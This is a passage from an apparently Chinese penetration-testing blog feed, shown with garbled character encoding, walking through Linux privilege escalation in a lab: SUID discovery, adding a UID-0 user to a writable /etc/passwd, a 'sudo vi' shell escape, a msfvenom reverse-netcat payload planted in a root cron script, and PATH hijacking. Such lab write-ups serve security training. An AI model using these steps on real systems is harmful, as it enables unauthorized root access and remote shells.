åˆ©ç”¨suid&#x2F;guidæ–‡ä»¶</p><h3 id="ä»€ä¹ˆæ˜¯suidäºŒè¿›åˆ¶æ–‡ä»¶"><a href="#ä»€ä¹ˆæ˜¯suidäºŒè¿›åˆ¶æ–‡ä»¶" class="headerlink" title="ä»€ä¹ˆæ˜¯suidäºŒè¿›åˆ¶æ–‡ä»¶"></a>ä»€ä¹ˆæ˜¯suidäºŒè¿›åˆ¶æ–‡ä»¶</h3><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œåœ¨ Linux ä¸­ï¼Œä¸€åˆ‡éƒ½æ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼ŒåŒ…æ‹¬æœ‰æƒå…è®¸æˆ–é™åˆ¶ä¸‰ä¸ªæ“ä½œçš„ç›®å½•å’Œè®¾å¤‡ï¼Œå³è¯»&#x2F;å†™&#x2F;æ‰§è¡Œã€‚å› æ­¤ï¼Œå½“æ‚¨ä¸ºä»»ä½•æ–‡ä»¶è®¾ç½®æƒé™æ—¶ï¼Œæ‚¨åº”è¯¥äº†è§£æ‚¨å…è®¸æˆ–é™åˆ¶æ‰€æœ‰ä¸‰ä¸ªæƒé™çš„ Linux ç”¨æˆ·ã€‚è¯·çœ‹ä»¥ä¸‹æœ€å¤§æƒé™ ï¼ˆrwx-rwx-rwxï¼‰ çš„æ¼”ç¤ºï¼š</p><p>r &#x3D; readÂ r &#x3D; è¯»å–<br>w &#x3D; writeÂ w &#x3D; å†™å…¥<br>x &#x3D; executeÂ x &#x3D; æ‰§è¡Œ  </p><table><thead><tr><th>user</th><th>group</th><th>others</th></tr></thead><tbody><tr><td>rwx</td><td>rwx</td><td>rwx</td></tr><tr><td>421</td><td>421</td><td>421</td></tr></tbody></table><p>ä½†æ˜¯ï¼Œå½“å‘æ¯ä¸ªç”¨æˆ·æˆäºˆç‰¹æ®Šæƒé™æ—¶ï¼Œå®ƒå°±å˜æˆäº† SUIDæˆ– SGIDã€‚</p><ul><li>SUID(rws-rwx-rwx)ï¼š 0è¡¨ç¤ºå»é™¤suidæƒé™ï¼Œ4è¡¨ç¤ºæ·»åŠ suidæƒé™ï¼Œè€Œä¸”æ˜¯åœ¨åŸæƒé™çš„æ•°å­—è¡¨è¾¾å½¢å¼å¼€å¤´åŠ 0æˆ–4ï¼Œå¦‚ï¼š0755ç§»é™¤suidæƒé™ï¼Œ4755æ·»åŠ suidæƒé™ã€‚</li><li>GUID(rwx-rws-rwx)ï¼š0è¡¨ç¤ºå»é™¤sgidæƒé™ï¼Œ2è¡¨ç¤ºæ·»åŠ sgidæƒé™ï¼Œè€Œä¸”æ˜¯åœ¨åŸæƒé™çš„æ•°å­—è¡¨è¾¾å½¢å¼å¼€å¤´åŠ 0æˆ–2ï¼Œå¦‚ï¼š0755ç§»é™¤sgidæƒé™ï¼Œ2755æ·»åŠ sgidæƒé™ã€‚</li></ul><h3 id="å¯»æ‰¾suidæ–‡ä»¶"><a href="#å¯»æ‰¾suidæ–‡ä»¶" class="headerlink" title="å¯»æ‰¾suidæ–‡ä»¶"></a>å¯»æ‰¾suidæ–‡ä»¶</h3><p>LinEnumèƒ½å¤Ÿè‡ªåŠ¨æ‰«æSUIDæ–‡ä»¶ï¼Œä¸è¿‡å¦‚æœè¦æ‰‹åŠ¨æ“ä½œï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å‘½ä»¤ï¼š<br><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p><ul><li>find - å¯åŠ¨â€œfindâ€å‘½ä»¤</li><li>&#x2F; - æœç´¢æ•´ä¸ªæ–‡ä»¶ç³»ç»Ÿ</li><li>-perm - æœç´¢å…·æœ‰ç‰¹å®šæƒé™çš„æ–‡ä»¶</li><li>-u&#x3D;s - ä¸ºæ–‡ä»¶è®¾ç½®äº†ä»»ä½•æƒé™ä½æ¨¡å¼ã€‚è¿™ç§å½¢å¼æ¥å—ç¬¦å·æ¨¡å¼</li><li>-type f - ä»…æœç´¢æ–‡ä»¶</li><li>2&gt;&#x2F;dev&#x2F;null - ç¦æ­¢æ˜¾ç¤ºé”™è¯¯</li></ul><h3 id="åˆ©ç”¨suidæ–‡ä»¶"><a href="#åˆ©ç”¨suidæ–‡ä»¶" class="headerlink" title="åˆ©ç”¨suidæ–‡ä»¶"></a>åˆ©ç”¨suidæ–‡ä»¶</h3><blockquote><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://gtfobins.github.io/">GTFOBins â€” èµ°å¼€åƒåœ¾ç®±</a></p></blockquote><h2 id="ä¸‰-åˆ©ç”¨å¯å†™çš„-etc-passwd"><a href="#ä¸‰-åˆ©ç”¨å¯å†™çš„-etc-passwd" class="headerlink" title="(ä¸‰) åˆ©ç”¨å¯å†™çš„ &#x2F;etc&#x2F;passwd"></a>(ä¸‰) åˆ©ç”¨å¯å†™çš„ &#x2F;etc&#x2F;passwd</h2><h3 id="ä½•ä¸º-etc-passwd"><a href="#ä½•ä¸º-etc-passwd" class="headerlink" title="ä½•ä¸º&#x2F;etc&#x2F;passwd"></a>ä½•ä¸º&#x2F;etc&#x2F;passwd</h3><blockquote><p>&#x2F;etc&#x2F;passwd æ–‡ä»¶å­˜å‚¨ç™»å½•æ—¶æ‰€éœ€çš„åŸºæœ¬ä¿¡æ¯ã€‚æ¢å¥è¯è¯´ï¼Œå®ƒå­˜å‚¨ç”¨æˆ·å¸æˆ·ä¿¡æ¯ã€‚&#x2F;etc&#x2F;passwd æ˜¯ä¸€ä¸ªçº¯æ–‡æœ¬æ–‡ä»¶ã€‚å®ƒåŒ…å«ç³»ç»Ÿå¸æˆ·åˆ—è¡¨ï¼Œä¸ºæ¯ä¸ªå¸æˆ·æä¾›ä¸€äº›æœ‰ç”¨çš„ä¿¡æ¯ï¼Œå¦‚ç”¨æˆ· IDã€ç»„ IDã€ä¸»ç›®å½•ã€shell ç­‰ã€‚</p></blockquote><p>&#x2F;etc&#x2F;passwd æ–‡ä»¶åº”å…·æœ‰å¸¸è§„è¯»å–æƒé™ï¼Œå› ä¸ºè®¸å¤šå‘½ä»¤å®ç”¨ç¨‹åºä½¿ç”¨å®ƒæ¥å°†ç”¨æˆ·æ ‡è¯†æ˜ å°„åˆ°ç”¨æˆ·åã€‚ä½†æ˜¯ï¼Œå¯¹ &#x2F;etc&#x2F;passwd çš„å†™å…¥è®¿é—®æƒé™<strong>å¿…é¡»ä»…é™åˆ¶è¶…çº§ç”¨æˆ·&#x2F;root å¸æˆ·</strong>ã€‚å¦‚æœæ²¡æœ‰ï¼Œæˆ–è€…ç”¨æˆ·è¢«é”™è¯¯åœ°æ·»åŠ åˆ°å…è®¸å†™å…¥çš„ç»„ä¸­ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯èƒ½å…è®¸åˆ›å»ºä¸€ä¸ªæˆ‘ä»¬å¯ä»¥è®¿é—®çš„rootç”¨æˆ·ã€‚</p><h3 id="etc-passwdçš„æ ¼å¼"><a href="#etc-passwdçš„æ ¼å¼" class="headerlink" title="&#x2F;etc&#x2F;passwdçš„æ ¼å¼"></a>&#x2F;etc&#x2F;passwdçš„æ ¼å¼</h3><p>&#x2F;etc&#x2F;passwd æ–‡ä»¶æ¯è¡ŒåŒ…å«ä¸€ä¸ªæ¡ç›®ï¼Œç”¨äºç³»ç»Ÿçš„æ¯ä¸ªç”¨æˆ·ï¼ˆç”¨æˆ·å¸æˆ·ï¼‰ã€‚æ‰€æœ‰å­—æ®µéƒ½ç”¨å†’å·â€œ:â€åˆ†éš”ã€‚æ€»å…±æœ‰ä¸ƒä¸ªå­—æ®µï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚é€šå¸¸ï¼Œ&#x2F;etc&#x2F;passwd æ–‡ä»¶æ¡ç›®å¦‚ä¸‹æ‰€ç¤ºï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">test:x:0:0:root:/root:/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>Usernameï¼šç”¨æˆ·åï¼Œç”¨æˆ·ç™»å½•æ—¶ä½¿ç”¨</li><li>Passwordï¼šå¯†ç ï¼Œx å­—ç¬¦è¡¨ç¤ºåŠ å¯†çš„å¯†ç å­˜å‚¨åœ¨ &#x2F;etc&#x2F;shadow æ–‡ä»¶ä¸­ã€‚è¯·æ³¨æ„ï¼Œæ‚¨éœ€è¦ä½¿ç”¨ passwd å‘½ä»¤æ¥è®¡ç®—åœ¨ CLI ä¸­é”®å…¥çš„å¯†ç çš„å“ˆå¸Œå€¼ï¼Œæˆ–è€…åœ¨ &#x2F;etc&#x2F;shadow æ–‡ä»¶ä¸­å­˜å‚¨&#x2F;æ›´æ–°å¯†ç çš„å“ˆå¸Œå€¼ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¯†ç å“ˆå¸Œå€¼å­˜å‚¨ä¸ºâ€œxâ€ã€‚</li><li>User ID(UID)ï¼šç”¨æˆ·IDï¼Œå¿…é¡»ä¸ºæ¯ä¸ªç”¨æˆ·åˆ†é…ä¸€ä¸ªç”¨æˆ· ID ï¼ˆUIDï¼‰ã€‚UID 0ï¼ˆé›¶ï¼‰ä¿ç•™ç»™ rootï¼ŒUID 1-99 ä¿ç•™ç»™å…¶ä»–é¢„å®šä¹‰å¸æˆ·ã€‚æ­¤å¤–ï¼ŒUID 100-999 ç”±ç³»ç»Ÿä¸ºç®¡ç†å’Œç³»ç»Ÿå¸æˆ·&#x2F;ç»„ä¿ç•™ã€‚</li><li>Group ID(GID)ï¼šç»„IDï¼Œå­˜å‚¨åœ¨ &#x2F;etc&#x2F;group æ–‡ä»¶ä¸­</li><li>User ID infoï¼šç”¨æˆ·IDä¿¡æ¯ï¼Œå®ƒå…è®¸æ‚¨æ·»åŠ æœ‰å…³ç”¨æˆ·çš„é¢å¤–ä¿¡æ¯ï¼Œä¾‹å¦‚ç”¨æˆ·çš„å…¨åã€ç”µè¯å·ç ç­‰ã€‚</li><li>Home directoryï¼šä¸»ç›®å½•ï¼Œç”¨æˆ·ç™»å½•æ—¶æ‰€åœ¨ç›®å½•çš„ç»å¯¹è·¯å¾„ã€‚å¦‚æœæ­¤ç›®å½•ä¸å­˜åœ¨ï¼Œåˆ™ users ç›®å½•å˜ä¸º &#x2F;</li><li>Command&#x2F;shellï¼šå‘½ä»¤æˆ– shell çš„ç»å¯¹è·¯å¾„ ï¼ˆ&#x2F;bin&#x2F;bashï¼‰ã€‚é€šå¸¸ï¼Œè¿™æ˜¯ä¸€ä¸ª shell</li></ol><h3 id="ç»ƒä¹ -1"><a href="#ç»ƒä¹ -1" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h3><p>ç»§ç»­æšä¸¾ç”¨æˆ·ï¼Œæˆ‘ä»¬å‘ç° user7 æ˜¯ gid ä¸º 0 çš„æ ¹ç»„çš„æˆå‘˜ã€‚æˆ‘ä»¬å·²ç»ä» LinEnum æ‰«æä¸­çŸ¥é“ &#x2F;etc&#x2F;passwd æ–‡ä»¶å¯¹ç”¨æˆ·æ¥è¯´æ˜¯å¯å†™çš„ã€‚å› æ­¤ï¼Œæ ¹æ®è¿™ä¸€è§‚å¯Ÿï¼Œæˆ‘ä»¬å¾—å‡ºç»“è®ºï¼Œuser7 å¯ä»¥ç¼–è¾‘ &#x2F;etc&#x2F;passwd æ–‡ä»¶ã€‚(ç°åœ¨å‡è®¾æˆ‘ä»¬å·²çŸ¥user7ç”¨æˆ·çš„å¯†ç ä¸ºpassword)<br><img src="/PenTest_FILE/29954f8582e4ee14fcca9fb04b4a25c5_MD5.jpeg"></p><p>å…¶å®å¾ˆç®€å•ï¼Œå¦‚æœæˆ‘ä»¬æœ‰ä¸€ä¸ªå¯å†™çš„ &#x2F;etc&#x2F;passwd æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®ä¸Šé¢çš„å…¬å¼å†™ä¸€ä¸ªæ–°è¡Œæ¡ç›®ï¼Œåˆ›å»ºä¸€ä¸ªæ–°ç”¨æˆ·ï¼æˆ‘ä»¬æ·»åŠ æˆ‘ä»¬é€‰æ‹©çš„å¯†ç å“ˆå¸Œï¼Œå¹¶å°† UIDã€GID å’Œ shell è®¾ç½®ä¸º rootã€‚å…è®¸æˆ‘ä»¬ä»¥è‡ªå·±çš„rootç”¨æˆ·èº«ä»½ç™»å½•ï¼</p><p><code>openssl passwd -1 -salt [salt] [password]</code>ï¼Œè¯¥å‘½ä»¤å¯ä»¥å¾—åˆ°ç”¨æˆ·hash</p><p>æ¯”å¦‚æˆ‘ä»¬å…ˆåˆ›å»ºä¸€ä¸ªç”¨æˆ·newï¼Œå¯†ç ä¸º123ï¼š<br><img src="/PenTest_FILE/67960ae526f35153c6894833c9d679e9_MD5.jpeg"><br>é‚£ä¹ˆå¯ä»¥æ¨æµ‹è¯¥ç”¨æˆ·çš„&#x2F;etc&#x2F;passwdæ¡ç›®æ˜¯ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">new:<span class="token variable">$1</span><span class="token variable">$new</span><span class="token variable">$p7ptkEKU1HnaHpRtzNizS1</span>:0:0:root:/root:/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ¥ä¸‹æ¥suåˆ‡æ¢ä¸ºuser7ï¼Œå°†å®ƒæ·»åŠ è‡³&#x2F;etc&#x2F;passwdçš„æœ«å°¾å³å¯<br><img src="/PenTest_FILE/57ed34af3a2da6053065f8e8ce8f17b4_MD5.jpeg"></p><h2 id="å››-åˆ©ç”¨viç¼–è¾‘å™¨"><a href="#å››-åˆ©ç”¨viç¼–è¾‘å™¨" class="headerlink" title="(å››) åˆ©ç”¨viç¼–è¾‘å™¨"></a>(å››) åˆ©ç”¨viç¼–è¾‘å™¨</h2><h3 id="sudo-lå‘½ä»¤"><a href="#sudo-lå‘½ä»¤" class="headerlink" title="sudo -lå‘½ä»¤"></a>sudo -lå‘½ä»¤</h3><p>æ¯æ¬¡è®¿é—®æŸä¸ªå¸æˆ·æ—¶ï¼Œéƒ½åº”ä½¿ç”¨<code>sudo -l</code>æ¥åˆ—å‡ºä½œä¸ºè¯¥å¸æˆ·å¯ä»¥ä½¿ç”¨çš„rootç”¨æˆ·å‘½ä»¤ã€‚æ‚¨ä¼šå‘ç°æ‚¨å¯ä»¥åœ¨æ²¡æœ‰ root å¯†ç çš„æƒ…å†µä¸‹ä»¥ root ç”¨æˆ·èº«ä»½è¿è¡ŒæŸäº›å‘½ä»¤ã€‚è¿™å¯ä»¥å¸®åŠ©æå‡æƒé™ã€‚</p><h3 id="ç»ƒä¹ -2"><a href="#ç»ƒä¹ -2" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h3><blockquote><p>èƒŒæ™¯ï¼šç™»å½•ç”¨æˆ·user8:password</p></blockquote><p>å…ˆçœ‹çœ‹æœ‰å“ªäº›rootå‘½ä»¤å¯ä¾›ä½¿ç”¨<br><img src="/PenTest_FILE/ea7dc6d0d4f798aeeb53fc1a93d1f1d4_MD5.jpeg"><br>ç›´æ¥<code>sudo vi</code>ï¼Œè¾“å…¥<code>: !sh</code><br><img src="/PenTest_FILE/006ffe6378b58ad085da0f91d55eaa79_MD5.jpeg"><br><img src="/PenTest_FILE/619894bdd61c728a3c621cc1a8fe2905_MD5.jpeg"></p><h2 id="äº”-åˆ©ç”¨crontab"><a href="#äº”-åˆ©ç”¨crontab" class="headerlink" title="(äº”) åˆ©ç”¨crontab"></a>(äº”) åˆ©ç”¨crontab</h2><h3 id="ä½•ä¸ºCronè¿›ç¨‹"><a href="#ä½•ä¸ºCronè¿›ç¨‹" class="headerlink" title="ä½•ä¸ºCronè¿›ç¨‹"></a>ä½•ä¸ºCronè¿›ç¨‹</h3><p>Cron å®ˆæŠ¤è¿›ç¨‹æ˜¯ä¸€ä¸ªé•¿æ—¶é—´è¿è¡Œçš„è¿›ç¨‹ï¼Œå®ƒåœ¨ç‰¹å®šæ—¥æœŸå’Œæ—¶é—´æ‰§è¡Œå‘½ä»¤ã€‚æ‚¨å¯ä»¥ä½¿ç”¨å®ƒæ¥è®¡åˆ’æ´»åŠ¨ï¼Œæ—¢å¯ä»¥ä½œä¸ºä¸€æ¬¡æ€§äº‹ä»¶ï¼Œä¹Ÿå¯ä»¥ä½œä¸ºé‡å¤æ€§ä»»åŠ¡ã€‚æ‚¨å¯ä»¥åˆ›å»ºä¸€ä¸ª crontab æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«ä¾› Cron å®ˆæŠ¤ç¨‹åºæ‰§è¡Œçš„å‘½ä»¤å’ŒæŒ‡ä»¤ã€‚</p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å‘½ä»¤ <code>â€œcat /etc/crontabâ€</code> æ¥æŸ¥çœ‹è°ƒåº¦äº†å“ªäº› cron ä½œä¸šã€‚æ¯å½“æœ‰æœºä¼šæ—¶ï¼Œæ‚¨éƒ½åº”è¯¥å§‹ç»ˆæ‰‹åŠ¨æ£€æŸ¥è¿™ä¸€ç‚¹ï¼Œå°¤å…¶æ˜¯åœ¨ LinEnum æˆ–ç±»ä¼¼è„šæœ¬æ‰¾ä¸åˆ°ä»»ä½•å†…å®¹çš„æƒ…å†µä¸‹ã€‚</p><h3 id="Cronjobçš„æ ¼å¼"><a href="#Cronjobçš„æ ¼å¼" class="headerlink" title="Cronjobçš„æ ¼å¼"></a>Cronjobçš„æ ¼å¼</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Example of job definition:                                                                 â”‚</span><span class="token comment"># .---------------- minute (0 - 59)                                                          â”‚</span><span class="token comment"># |  .------------- hour (0 - 23)                                                            â”‚</span><span class="token comment"># |  |  .---------- day of month (1 - 31)                                                    â”‚</span><span class="token comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...                                    â”‚</span><span class="token comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat       â”‚</span><span class="token comment"># |  |  |  |  |                                                                              â”‚</span><span class="token comment"># *  *  *  *  * user-name command to be executed    </span><span class="token number">17</span> *    * * *   root    <span class="token builtin class-name">cd</span> / <span class="token operator">&amp;&amp;</span> run-parts <span class="token parameter variable">--report</span> /etc/cron.hourly  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ç»ƒä¹ -3"><a href="#ç»ƒä¹ -3" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h3><p>æˆ‘ä»¬ä» LinEnum æ‰«æä¸­å¾—çŸ¥ï¼Œuser4 æ¡Œé¢ä¸Šçš„æ–‡ä»¶ autoscript.sh è®¡åˆ’æ¯äº”åˆ†é’Ÿè¿è¡Œä¸€æ¬¡ã€‚å®ƒå½’ root æ‰€æœ‰ï¼Œè¿™æ„å‘³ç€å®ƒå°†ä»¥ root æƒé™è¿è¡Œï¼Œå°½ç®¡æˆ‘ä»¬å¯ä»¥å†™å…¥æ­¤æ–‡ä»¶ã€‚ç„¶åï¼Œä»»åŠ¡æ˜¯åˆ›å»ºä¸€ä¸ªå‘½ä»¤ï¼Œè¯¥å‘½ä»¤å°†è¿”å›ä¸€ä¸ª shell å¹¶å°†å…¶ç²˜è´´åˆ°æ­¤æ–‡ä»¶ä¸­ã€‚å½“æ–‡ä»¶åœ¨äº”åˆ†é’Ÿåå†æ¬¡è¿è¡Œæ—¶ï¼Œshell å°†ä»¥ root èº«ä»½è¿è¡Œã€‚</p><p><img src="/PenTest_FILE/9ee0f823d61b02fba0bf64c69e4bcff7_MD5.jpeg"><br><img src="/PenTest_FILE/9751d7e7e26ed9e384794a4271832589_MD5.jpeg"></p><p>æˆ‘ä»¬ä½¿ç”¨ msfvenom ä¸ºæˆ‘ä»¬çš„ cron æ¼æ´åˆ›å»ºä¸€ä¸ªåå¼¹shellçš„payloadï¼Œå‘½ä»¤ <code>msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R</code><br><img src="/PenTest_FILE/ca4bea5480bb2b56990b43e04b11655e_MD5.jpeg"></p><p>å°†payloadå†™å…¥ autoscript.shæ–‡ä»¶ï¼Œæ¥ç€åœ¨æœ¬åœ°è¿›è¡Œç›‘å¬ï¼Œçº¦5åˆ†é’ŸåæˆåŠŸåå¼¹shellï¼<br><img src="/PenTest_FILE/ceda654dc6d8b3f9d2bcc5ab9e639554_MD5.jpeg"></p><h2 id="å…­-åˆ©ç”¨PATHå˜é‡"><a href="#å…­-åˆ©ç”¨PATHå˜é‡" class="headerlink" title="(å…­) åˆ©ç”¨PATHå˜é‡"></a>(å…­) åˆ©ç”¨PATHå˜é‡</h2><h3 id="ä»€ä¹ˆæ˜¯-PATH"><a href="#ä»€ä¹ˆæ˜¯-PATH" class="headerlink" title="ä»€ä¹ˆæ˜¯$PATH"></a>ä»€ä¹ˆæ˜¯$PATH</h3><p>PATH æ˜¯ Linux å’Œç±» Unix æ“ä½œç³»ç»Ÿä¸­çš„ç¯å¢ƒå˜é‡ï¼Œå®ƒæŒ‡å®šä¿å­˜å¯æ‰§è¡Œç¨‹åºçš„ç›®å½•ã€‚<strong>å½“ç”¨æˆ·åœ¨ç»ˆç«¯ä¸­è¿è¡Œä»»ä½•å‘½ä»¤æ—¶ï¼Œå®ƒä¼šå€ŸåŠ© PATH å˜é‡æœç´¢å¯æ‰§è¡Œæ–‡ä»¶ï¼Œä»¥å“åº”ç”¨æˆ·æ‰§è¡Œçš„å‘½ä»¤ã€‚</strong></p><p>å€ŸåŠ©å‘½ä»¤<code>â€œecho $PATHâ€</code>æŸ¥çœ‹ç›¸å…³ç”¨æˆ·çš„è·¯å¾„éå¸¸ç®€å•ã€‚<br><img src="/PenTest_FILE/cabb436cde1b15b6f8fcfae5a9e8a8de_MD5.jpeg"></p><h3 id="å¦‚ä½•åˆ©ç”¨-PATH"><a href="#å¦‚ä½•åˆ©ç”¨-PATH" class="headerlink" title="å¦‚ä½•åˆ©ç”¨$PATH"></a>å¦‚ä½•åˆ©ç”¨$PATH</h3><p>å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ª SUID äºŒè¿›åˆ¶æ–‡ä»¶ã€‚è¿è¡Œå®ƒï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å®ƒæ­£åœ¨è°ƒç”¨ç³»ç»Ÿ shell æ¥æ‰§è¡Œä¸€ä¸ªåŸºæœ¬åŠŸèƒ½ï¼Œä¾‹å¦‚ä½¿ç”¨â€œpsâ€åˆ—å‡ºè¿›ç¨‹ã€‚ä¸æˆ‘ä»¬ä¹‹å‰çš„ SUID ç¤ºä¾‹ä¸åŒï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æ— æ³•é€šè¿‡æä¾›æ³¨å…¥å‚æ•°æ¥åˆ©ç”¨å®ƒï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åšäº›ä»€ä¹ˆæ¥å°è¯•åˆ©ç”¨å®ƒå‘¢ï¼Ÿ</p><p>æˆ‘ä»¬å¯ä»¥å°† PATH å˜é‡é‡å†™åˆ°æˆ‘ä»¬é€‰æ‹©çš„ä½ç½®ï¼å½“ SUID äºŒè¿›åˆ¶æ–‡ä»¶è°ƒç”¨ç³»ç»Ÿ shell æ¥è¿è¡Œå¯æ‰§è¡Œæ–‡ä»¶æ—¶ï¼Œå®ƒä¼šè¿è¡Œæˆ‘ä»¬ç¼–å†™çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚</p><h3 id="ç»ƒä¹ -4"><a href="#ç»ƒä¹ -4" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h3><p>ç›®å½•ä¸‹æœ‰ä¸ªåä¸ºâ€œscriptâ€çš„æ–‡ä»¶ï¼Œè¿è¡Œä¸‹çœ‹çœ‹ï¼š<br><img src="/PenTest_FILE/6a7a003dbc3339fa894ee9f1efc326c2_MD5.jpeg"><br>å…·æœ‰suidæƒé™ï¼Œå®ç°äº†ç›®å½• ls åŠŸèƒ½</p><p>æˆ‘ä»¬å…ˆå°†ç›®å½•æ”¹ä¸º&#x2F;tmpï¼Œåˆ›å»ºä¸€ä¸ªä¼ªé€ å¯æ‰§è¡Œæ–‡ä»¶ï¼Œæ ¼å¼æ˜¯<code>echo â€œ[æ— è®ºæˆ‘ä»¬æƒ³è¿è¡Œä»€ä¹ˆå‘½ä»¤]â€ &gt; [æˆ‘ä»¬æ­£åœ¨æ¨¡ä»¿çš„å¯æ‰§è¡Œæ–‡ä»¶çš„åç§°]</code><br><img src="/PenTest_FILE/da75c583e5ecf424d5f04c1addf2cc1f_MD5.jpeg"></p><p>æ¥ç€æ›´æ”¹è·¯å¾„å˜é‡ï¼Œä½¿å…¶æŒ‡å‘å­˜å‚¨ç€ä¼ªé€ â€œlsâ€çš„ç›®å½•ï¼Œå‘½ä»¤æ˜¯<code>export PATH=/tmp:$PATH</code>ï¼Œåœ¨$PATHå‰é¢åŠ ä¸Š&#x2F;tmpç›®å½•ã€‚<br>è¯·æ³¨æ„ï¼Œè¿™å°†å¯¼è‡´æ‚¨æ¯æ¬¡ä½¿ç”¨â€œlsâ€æ—¶éƒ½æ‰“å¼€ bash æç¤ºç¬¦ã€‚å¦‚æœä½ åœ¨å®Œæˆæ¼æ´åˆ©ç”¨ä¹‹å‰éœ€è¦ä½¿ç”¨â€œlsâ€ï¼Œè¯·ä½¿ç”¨<code>â€œ/bin/lsâ€</code>ï¼Œæ˜¯çœŸæ­£çš„â€œlsâ€å¯æ‰§è¡Œæ–‡ä»¶æ‰€åœ¨ã€‚<br><img src="/PenTest_FILE/b9eb04149b140969d0cced3a60645eb7_MD5.jpeg"></p><p>æˆåŠŸå¾—åˆ°rootæƒé™ï¼<br><img src="/PenTest_FILE/cfb51fd1b4cad70c9d34ab1ee7657159_MD5.jpeg"></p><blockquote><p>ä¸€æ—¦ä½ å®Œæˆäº†è¿™ä¸ªæ¼æ´åˆ©ç”¨ï¼Œä½ å¯ä»¥é€€å‡ºrootï¼Œå¹¶ä½¿ç”¨<code>export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH</code>ï¼Œå°†PATHå˜é‡é‡ç½®ä¸ºé»˜è®¤å€¼ï¼Œè®©ä½ èƒ½å¤Ÿæ­£å¸¸ä½¿ç”¨â€œlsâ€</p></blockquote><h2 id="æ‰©å±•"><a href="#æ‰©å±•" class="headerlink" title="æ‰©å±•"></a>æ‰©å±•</h2><p>åœ¨ Linux æƒé™æå‡è¿™ä¸ªå·¨å¤§çš„é¢†åŸŸä¸­ï¼Œä»æ¥æ²¡æœ‰ä¸€ä¸ªâ€œç¥å¥‡â€çš„ç­”æ¡ˆã€‚è¿™åªæ˜¯å°è¯•æå‡æƒé™æ—¶éœ€è¦æ³¨æ„çš„åŸºæœ¬äº‹é¡¹çš„å‡ ä¸ªç¤ºä¾‹ï¼Œè¦æƒ³åšå¾—æ›´å¥½ï¼Œå”¯ä¸€çš„æ–¹æ³•å°±æ˜¯ç»ƒä¹ å’Œç§¯ç´¯ç»éªŒã€‚æ¸…å•æ˜¯ç¡®ä¿æ‚¨åœ¨æšä¸¾é˜¶æ®µæ²¡æœ‰é—æ¼ä»»ä½•å†…å®¹çš„å¥½æ–¹æ³•ï¼Œå¹¶ä¸”è¿˜å¯ä»¥ä¸ºæ‚¨æä¾›ä¸€ä¸ªèµ„æºï¼Œä»¥ä¾¿åœ¨æ‚¨å¿˜è®°ç¡®åˆ‡ä½¿ç”¨å“ªäº›å‘½ä»¤æ—¶æ£€æŸ¥å¦‚ä½•æ‰§è¡Œæ“ä½œã€‚</p><p>ä»¥ä¸‹æ˜¯é€‚ç”¨äº CTF æˆ–æ¸—é€æµ‹è¯•ç”¨ä¾‹çš„è‰¯å¥½æ¸…å•åˆ—è¡¨ã€‚è™½ç„¶æˆ‘é¼“åŠ±ä½ ä½¿ç”¨CherryTreeæˆ–ä»»ä½•ä½ å–œæ¬¢çš„ç¬”è®°åº”ç”¨ç¨‹åºæ¥åˆ¶ä½œè‡ªå·±çš„ç¬”è®°ã€‚</p><ul><li><a href="https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md">https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md</a></li><li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md</a></li><li><a href="https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html">https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html</a></li><li><a href="https://payatu.com/guide-linux-privilege-escalation">https://payatu.com/guide-linux-privilege-escalation</a></li></ul><p><strong>Thank you</strong><br>æ„Ÿè°¢æ‚¨æŠ½å‡ºå®è´µæ—¶é—´åœ¨è¿™ä¸ªæˆ¿é—´é‡Œå·¥ä½œï¼Œç¥æ‚¨æœªæ¥å¥½è¿ã€‚</p><h1 id="ä¸‰ã€Linuxææƒç»ƒä¹ "><a href="#ä¸‰ã€Linuxææƒç»ƒä¹ " class="headerlink" title="ä¸‰ã€Linuxææƒç»ƒä¹ "></a>ä¸‰ã€Linuxææƒç»ƒä¹ </h1>]]></content>
      
      
      <categories>
          
          <category> è¿›æ”»æ€§æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Basic Pentesting</title>
